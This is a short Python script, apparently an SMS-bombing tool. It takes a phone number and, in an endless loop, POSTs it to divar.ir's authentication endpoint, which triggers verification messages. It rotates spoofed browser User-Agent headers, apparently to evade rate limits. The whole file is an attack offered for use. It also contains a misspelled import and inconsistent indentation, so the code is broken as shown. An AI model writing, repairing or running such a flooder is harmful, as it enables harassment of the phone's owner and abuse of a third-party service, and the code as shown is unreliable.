import requests
impot random
import time

number = input("Enter Your Phone number (without 0) : ")
url_divar = "https://api.divar.ir/v5/auth/authenticate"
json_divar = {"phone":number}

heads = [ 
  { 'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; rv:76.0)Gecko/20100101 Firefox/76.0', 'Accept': '*/*' },
  { "User-Agent" : "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0)Gecko/20100101 Firefox/72.0", 'Accept': '*/*' },
{ "User-Agent" : "Mozilla/5.0 (X11; Debian; Linux X86_64; rv:72.0)Gecko/20100101 Firefox/72.0", 'Accept': '*/*' },
]

while True:
	
	random_head =random.choice(heads)
	
   req = requests.post(url=url_divar,json=json_divar,headers=random_head)
    print(req)
